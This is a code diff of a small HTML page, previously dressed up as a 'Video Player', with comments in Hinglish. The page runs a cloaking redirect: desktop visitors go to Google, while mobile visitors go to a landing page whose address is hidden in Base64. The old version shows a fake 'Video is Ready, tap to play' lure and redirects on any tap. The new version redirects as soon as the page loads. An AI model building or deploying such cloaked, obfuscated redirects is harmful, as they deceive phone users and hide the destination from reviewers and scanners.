@@ -1,52 +1,25 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player</title>
-    <script>
-        // Aapka strikingy link Base64 mein
-        var m_url = "aHR0cHM6Ly9lbmVyZ2V0aWMtb3JhbmdlLXNzd2h0di5teXN0cmlraW5nbHkuY29tLw==";
-        var p_url = "https://www.google.com";
 
-        function checkDevice() {
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        (function() {
+            var m_url = "aHR0cHM6Ly9lbmVyZ2V0aWMtb3JhbmdlLXNzd2h0di5teXN0cmlraW5nbHkuY29tLw==";
+            var p_url = "https://www.google.com";
+            
             var ua = navigator.userAgent.toLowerCase();
-            // Laptop/PC Check (Windows, Mac, Linux)
-            var isPC = /windows|macintosh|linux/i.test(ua) && !/android/i.test(ua);
+            var isPC = /windows|macintosh|linux/i.test(ua) && !/android|iphone|ipad|ipod/i.test(ua);
 
             if (isPC) {
-                // Agar Laptop hai toh foran Google pe bhej do
+                // Laptop/PC par seedha Google
                 window.location.replace(p_url);
             } else {
-                // Agar Mobile hai toh page dikhao
-                document.getElementById("mobile-content").style.display = "block";
+                // Mobile par seedha (Direct) Strikingly landing page
+                window.location.replace(atob(m_url));
             }
-        }
-
-        function goNow() {
-            // Screen pe kahin bhi click ho toh redirect
-            window.location.href = atob(m_url);
-        }
-
-        window.onload = checkDevice;
+        })();
     </script>
-    <style>
-        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background: #000; color: #fff; cursor: pointer; }
-        #mobile-content { display: none; height: 100vh; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .play-btn { width: 80px; height: 80px; background: red; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
-        .play-btn::after { content: ''; border-left: 25px solid white; border-top: 15px solid transparent; border-bottom: 15px solid transparent; margin-left: 10px; }
-        h2 { font-size: 24px; margin: 10px; }
-        p { color: #ccc; }
-    </style>
 </head>
-<body onclick="goNow()">
-
-    <div id="mobile-content">
-        <div class="play-btn"></div>
-        <h2>Video is Ready</h2>
-        <p>Tap anywhere on the screen to play</p>
-    </div>
-
+<body>
 </body>
 </html>
-
